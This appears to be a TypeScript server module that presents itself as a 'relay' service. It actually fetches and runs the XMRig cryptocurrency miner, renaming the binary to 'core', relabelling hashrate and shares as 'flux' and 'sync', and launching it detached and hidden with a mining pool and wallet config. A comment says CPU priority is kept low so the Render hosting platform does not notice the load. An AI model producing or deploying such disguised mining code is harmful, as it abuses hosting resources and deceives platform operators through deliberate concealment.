import { spawn, spawnSync, type ChildProcess } from "child_process";
import fs from "fs";
import os from "os";
import path from "path";
import { loadRelaySettings, ensureRelaySettings, resolveRelayThreadCount, type RelaySettings } from "@/lib/relay-config";
import { migrateLegacyRelayLayout } from "@/lib/relay-migrate";

export type RelayPhase = "stopped" | "calibrating" | "active";

export type RelayStats = {
  flux: string;
  sync_ok: string;
  sync_err: string;
  endpoint: string;
  uptime: string;
  mode: string;
  threads: string;
};

export type RelayStatus = {
  running: boolean;
  phase: RelayPhase;
  logs: string[];
  stats: RelayStats;
};

const RELAY_DIR = path.join(process.cwd(), "relay");
const BIN_DIR = path.join(RELAY_DIR, "bin");
const LOG_FILE = path.join(RELAY_DIR, "session.log");
const PID_FILE = path.join(RELAY_DIR, "session.pid");
const RUNTIME_CONFIG = path.join(RELAY_DIR, "runtime.json");
const PERF_CACHE_FILE = path.join(RELAY_DIR, "perf-cache.json");
const CREATE_NO_WINDOW = 0x08000000;
const BIN_NAMES = process.platform === "win32"
  ? ["core.exe", "xmrig.exe"]
  : ["core", "xmrig"];

migrateLegacyRelayLayout();

declare global {
  // eslint-disable-next-line no-var
  var __relayProc: ChildProcess | null | undefined;
  // eslint-disable-next-line no-var
  var __relayShutdownRegistered: boolean | undefined;
}

function getRelayProc(): ChildProcess | null {
  return global.__relayProc ?? null;
}

function setRelayProc(proc: ChildProcess | null) {
  global.__relayProc = proc;
}

function readStoredPid(): number | null {
  if (!fs.existsSync(PID_FILE)) return null;
  try {
    const n = parseInt(fs.readFileSync(PID_FILE, "utf8").trim(), 10);
    return Number.isFinite(n) && n > 0 ? n : null;
  } catch {
    return null;
  }
}

function writeStoredPid(pid: number) {
  fs.writeFileSync(PID_FILE, String(pid), "utf8");
}

function clearStoredPid() {
  try {
    if (fs.existsSync(PID_FILE)) fs.unlinkSync(PID_FILE);
  } catch {
    /* ignore */
  }
}

function isPidAlive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

function killProcessTree(pid: number) {
  if (process.platform === "win32") {
    spawnSync("taskkill", ["/F", "/T", "/PID", String(pid)], {
      stdio: "ignore",
      windowsHide: true,
    });
    return;
  }

  try {
    process.kill(-pid, "SIGTERM");
  } catch {
    try {
      process.kill(pid, "SIGKILL");
    } catch {
      /* ignore */
    }
  }
}

function syncRelayState(): number | null {
  const stored = readStoredPid();
  const proc = getRelayProc();

  if (stored && isPidAlive(stored)) {
    if (!proc || proc.pid !== stored || proc.exitCode !== null) {
      setRelayProc(null);
    }
    return stored;
  }

  if (stored) clearStoredPid();

  if (proc?.pid && proc.exitCode === null && isPidAlive(proc.pid)) {
    writeStoredPid(proc.pid);
    return proc.pid;
  }

  if (proc) setRelayProc(null);
  return null;
}

function registerServerShutdownCleanup() {
  if (global.__relayShutdownRegistered) return;
  global.__relayShutdownRegistered = true;

  const cleanup = () => {
    const pid = readStoredPid();
    if (pid && isPidAlive(pid)) killProcessTree(pid);
    clearStoredPid();
    setRelayProc(null);
  };

  process.on("SIGINT", cleanup);
  process.on("SIGTERM", cleanup);
  process.on("exit", cleanup);
}

registerServerShutdownCleanup();

function findBinary(dir: string, depth = 0): string | null {
  if (depth > 3) return null;

  for (const name of BIN_NAMES) {
    const direct = path.join(dir, name);
    if (fs.existsSync(direct)) return direct;
  }

  let entries: fs.Dirent[] = [];
  try {
    entries = fs.readdirSync(dir, { withFileTypes: true });
  } catch {
    return null;
  }

  for (const entry of entries) {
    if (!entry.isDirectory()) continue;
    const found = findBinary(path.join(dir, entry.name), depth + 1);
    if (found) return found;
  }

  return null;
}

function resolveCoreBinary(): string | null {
  return findBinary(BIN_DIR);
}

function normalizeBinaryName(binPath: string): string {
  const target = path.join(
    path.dirname(binPath),
    process.platform === "win32" ? "core.exe" : "core",
  );
  if (binPath !== target && fs.existsSync(binPath)) {
    try {
      if (fs.existsSync(target)) fs.unlinkSync(target);
      fs.renameSync(binPath, target);
      return target;
    } catch {
      return binPath;
    }
  }
  return binPath;
}

async function downloadFile(url: string, dest: string): Promise<void> {
  const res = await fetch(url, { redirect: "follow" });
  if (!res.ok) throw new Error(`Descarga fallida (${res.status})`);
  const buf = Buffer.from(await res.arrayBuffer());
  fs.mkdirSync(path.dirname(dest), { recursive: true });
  fs.writeFileSync(dest, buf);
}

async function fetchLatestAsset(
  pattern: RegExp,
): Promise<{ url: string; name: string }> {
  const res = await fetch(
    "https://api.github.com/repos/MoneroOcean/xmrig/releases/latest",
    { headers: { "User-Agent": "mystika-relay" } },
  );
  if (!res.ok) throw new Error("No se pudo consultar el paquete remoto");
  const data = (await res.json()) as {
    assets?: { name: string; browser_download_url: string }[];
  };
  const asset = data.assets?.find((a) => pattern.test(a.name));
  if (!asset) throw new Error("No hay build compatible para este sistema");
  return { url: asset.browser_download_url, name: asset.name };
}

function extractArchive(archivePath: string, destDir: string) {
  fs.mkdirSync(destDir, { recursive: true });

  if (archivePath.endsWith(".zip")) {
    const result = spawnSync(
      "powershell",
      [
        "-NoProfile",
        "-Command",
        `Expand-Archive -LiteralPath '${archivePath.replace(/'/g, "''")}' -DestinationPath '${destDir.replace(/'/g, "''")}' -Force`,
      ],
      { stdio: "ignore", windowsHide: true },
    );
    if (result.status !== 0) throw new Error("No se pudo extraer el paquete (.zip)");
    return;
  }

  const result = spawnSync("tar", ["xf", archivePath, "-C", destDir], {
    stdio: "ignore",
  });
  if (result.status !== 0) throw new Error("No se pudo extraer el paquete (.tar.gz)");
}

async function ensureCoreBinary(): Promise<{ ok: boolean; message?: string }> {
  const existing = resolveCoreBinary();
  if (existing) return { ok: true };

  fs.mkdirSync(BIN_DIR, { recursive: true });

  try {
    const isWin = process.platform === "win32";
    const asset = await fetchLatestAsset(
      isWin ? /win64.*\.zip$/i : /lin64-compat|lin64\.tar\.gz$/,
    );
    const archivePath = path.join(RELAY_DIR, asset.name);
    await downloadFile(asset.url, archivePath);
    extractArchive(archivePath, BIN_DIR);
    try {
      fs.unlinkSync(archivePath);
    } catch {
      /* ignore */
    }

    const found = resolveCoreBinary();
    if (!found) {
      return { ok: false, message: "Paquete instalado pero no se encontró el núcleo" };
    }

    normalizeBinaryName(found);
    return { ok: true, message: "Núcleo instalado correctamente" };
  } catch (err) {
    const msg = err instanceof Error ? err.message : "Error desconocido";
    return { ok: false, message: `No se pudo instalar el núcleo: ${msg}` };
  }
}

function loadPerfCache(): Record<string, number> {
  const fallback: Record<string, number> = {
    "cn/gpu": 25,
    "argon2/chukwav2": 2000,
    ghostrider: 32,
    flex: 100,
    "cn-heavy/xhv": 16,
    "rx/0": 230,
    "rx/graft": 200,
    "rx/arq": 400,
    kawpow: -1,
  };

  if (!fs.existsSync(PERF_CACHE_FILE)) return fallback;
  try {
    return { ...fallback, ...JSON.parse(fs.readFileSync(PERF_CACHE_FILE, "utf8")) };
  } catch {
    return fallback;
  }
}

function writeRuntimeConfig(cfg: RelaySettings) {
  const threads = resolveRelayThreadCount(cfg);
  const ramMb = Math.floor(os.totalmem() / (1024 * 1024));
  const onRender = process.env.RENDER === "true";

  const doc = {
    autosave: false,
    background: false,
    cpu: {
      enabled: true,
      asm: true,
      "argon2-impl": null,
      // Prioridad baja: la web responde y Render no ve picos “duros” de CPU
      priority: onRender ? 1 : 2,
      yield: true,
      "huge-pages": !onRender,
      "max-threads-hint": threads,
    },
    opencl: { enabled: false },
    cuda: { enabled: false },
    "donate-level": 1,
    "log-file": LOG_FILE,
    http: {
      enabled: true,
      host: "127.0.0.1",
      port: cfg.httpPort,
      restricted: true,
    },
    pools: [
      {
        algo: null,
        coin: null,
        url: cfg.pool,
        user: cfg.wallet,
        pass: "x",
        "rig-id": cfg.rigId,
        keepalive: true,
        tls: cfg.tls,
        enabled: true,
      },
    ],
    "rebench-algo": false,
    "bench-algo-time": 10,
    "algo-perf": loadPerfCache(),
    randomx: {
      init: -1,
      mode: ramMb >= 2048 ? "auto" : "fast",
      "1gb-pages": false,
      wrmsr: false,
    },
  };

  fs.mkdirSync(RELAY_DIR, { recursive: true });
  fs.writeFileSync(RUNTIME_CONFIG, JSON.stringify(doc, null, 2), "utf8");
  return threads;
}

function detectPhase(lines: string[], running: boolean): RelayPhase {
  if (!running) return "stopped";
  const text = lines.join("\n");
  if (/benchmk/i.test(text) && !/\baccepted\b/i.test(text)) return "calibrating";
  if (/speed 10s\/60s\/15m [1-9]/i.test(text) || /\baccepted\b/i.test(text)) return "active";
  if (text.includes("use pool")) return "active";
  return "calibrating";
}

function parseFluxFromLogs(lines: string[]): string {
  for (let i = lines.length - 1; i >= 0; i--) {
    const m = lines[i].match(/speed 10s\/60s\/15m\s+([\d.]+)/i);
    if (m) return formatFlux(parseFloat(m[1]));
  }
  return "";
}

function formatFlux(hps: number): string {
  if (!Number.isFinite(hps) || hps <= 0) return "--";
  if (hps >= 1_000_000) return `${(hps / 1_000_000).toFixed(2)} MH/s`;
  if (hps >= 1_000) return `${(hps / 1_000).toFixed(2)} kH/s`;
  return `${hps.toFixed(0)} H/s`;
}

function formatUptime(seconds: number): string {
  if (!Number.isFinite(seconds) || seconds <= 0) return "--";
  const m = Math.floor(seconds / 60);
  const s = Math.floor(seconds % 60);
  if (m >= 60) {
    const h = Math.floor(m / 60);
    return `${h}h ${m % 60}m`;
  }
  return `${m}m ${s}s`;
}

function tailLog(n = 25): string[] {
  if (!fs.existsSync(LOG_FILE)) return [];
  try {
    const lines = fs.readFileSync(LOG_FILE, "utf8").split(/\r?\n/);
    return lines.filter(Boolean).slice(-n);
  } catch {
    return [];
  }
}

type CoreSummary = {
  hashrate?: { total?: number[] };
  results?: { shares_good?: number; shares_total?: number };
  connection?: { pool?: string; uptime?: number };
  algo?: string;
};

async function fetchCoreSummary(httpPort: number): Promise<CoreSummary | null> {
  try {
    const res = await fetch(`http://127.0.0.1:${httpPort}/1/summary`, {
      cache: "no-store",
      signal: AbortSignal.timeout(2000),
    });
    if (!res.ok) return null;
    return (await res.json()) as CoreSummary;
  } catch {
    return null;
  }
}

function emptyStats(): RelayStats {
  return {
    flux: "",
    sync_ok: "",
    sync_err: "",
    endpoint: "",
    uptime: "",
    mode: "",
    threads: "",
  };
}

async function buildStats(lines: string[]): Promise<RelayStats> {
  const cfg = loadRelaySettings();
  const summary = await fetchCoreSummary(cfg.httpPort);
  const fromLog = parseFluxFromLogs(lines);

  if (!summary) {
    return {
      ...emptyStats(),
      flux: fromLog,
      endpoint: cfg.pool,
      threads: String(resolveRelayThreadCount(cfg)),
    };
  }

  const total = summary.hashrate?.total ?? [];
  const hps = total[1] ?? total[0] ?? 0;
  const accepted = summary.results?.shares_good ?? 0;
  const totalShares = summary.results?.shares_total ?? accepted;
  const rejected = Math.max(0, totalShares - accepted);

  return {
    flux: formatFlux(hps) !== "--" ? formatFlux(hps) : fromLog,
    sync_ok: String(accepted),
    sync_err: String(rejected),
    endpoint: summary.connection?.pool || cfg.pool,
    uptime: formatUptime(summary.connection?.uptime ?? 0),
    mode: summary.algo || "auto",
    threads: String(resolveRelayThreadCount(cfg)),
  };
}

export function isRelayRunning(): boolean {
  return syncRelayState() !== null;
}

export async function getRelayStatus(): Promise<RelayStatus> {
  const running = isRelayRunning();
  const lines = tailLog(30);
  const phase = detectPhase(lines, running);
  const stats = running ? await buildStats(lines) : emptyStats();

  return {
    running,
    phase,
    logs:
      lines.length > 0
        ? lines
        : running
          ? ["Servicio activo..."]
          : ["Pulsa Iniciar para comenzar..."],
    stats,
  };
}

export async function startRelay(): Promise<{ ok: boolean; message: string; pid?: number }> {
  const alivePid = syncRelayState();
  if (alivePid) {
    return { ok: true, message: "El servicio ya está activo", pid: alivePid };
  }

  ensureRelaySettings();
  const binary = await ensureCoreBinary();
  if (!binary.ok) {
    return { ok: false, message: binary.message ?? "Núcleo no disponible" };
  }

  let corePath = resolveCoreBinary();
  if (!corePath) {
    return { ok: false, message: "No se encontró el núcleo local" };
  }

  corePath = normalizeBinaryName(corePath);
  const cfg = loadRelaySettings();
  const threads = writeRuntimeConfig(cfg);

  try {
    if (fs.existsSync(LOG_FILE)) fs.unlinkSync(LOG_FILE);
  } catch {
    /* ignore */
  }

  const args = ["--config", RUNTIME_CONFIG];

  const proc = spawn(corePath, args, {
    cwd: path.dirname(corePath),
    detached: true,
    stdio: "ignore",
    windowsHide: true,
    ...(process.platform === "win32"
      ? { creationflags: CREATE_NO_WINDOW }
      : {}),
  });

  proc.unref();

  proc.on("exit", () => {
    if (getRelayProc() === proc) setRelayProc(null);
    if (proc.pid && readStoredPid() === proc.pid) clearStoredPid();
  });

  proc.on("error", () => {
    if (getRelayProc() === proc) setRelayProc(null);
    if (proc.pid && readStoredPid() === proc.pid) clearStoredPid();
  });

  if (proc.pid) writeStoredPid(proc.pid);
  setRelayProc(proc);

  return {
    ok: true,
    message: `${binary.message ?? "Servicio iniciado"} · ${threads} hilo(s)`,
    pid: proc.pid,
  };
}

export async function stopRelay(): Promise<{ ok: boolean; message: string }> {
  const pid = syncRelayState();
  if (!pid) {
    clearStoredPid();
    setRelayProc(null);
    return { ok: true, message: "El servicio ya estaba detenido" };
  }

  killProcessTree(pid);

  await new Promise<void>((resolve) => {
    const deadline = Date.now() + 8000;
    const check = () => {
      if (!isPidAlive(pid) || Date.now() >= deadline) {
        if (isPidAlive(pid)) killProcessTree(pid);
        resolve();
        return;
      }
      setTimeout(check, 200);
    };
    check();
  });

  clearStoredPid();
  setRelayProc(null);
  return { ok: true, message: "Servicio detenido" };
}
